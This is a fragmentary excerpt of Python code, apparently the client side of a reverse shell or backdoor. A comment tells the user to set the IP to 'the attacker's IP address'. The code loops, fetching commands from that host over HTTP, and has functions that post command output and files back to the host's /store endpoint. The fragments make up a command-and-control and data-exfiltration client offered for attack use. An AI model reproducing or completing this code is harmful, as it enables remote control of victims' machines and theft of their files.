...
ip = '127.0.0.1' # change this to the attacker's IP address
port = 8080

# Data is a dict
def send_post(data, url=f'http://{ip}:{port}'):
    data = {"rfile": data}
...
def send_file(command):
    ...
    store_url = f'http://{ip}:{port}/store' # Posts to /store
...
while True:
    command = request.urlopen(f"http://{ip}:{port}").read().decode()
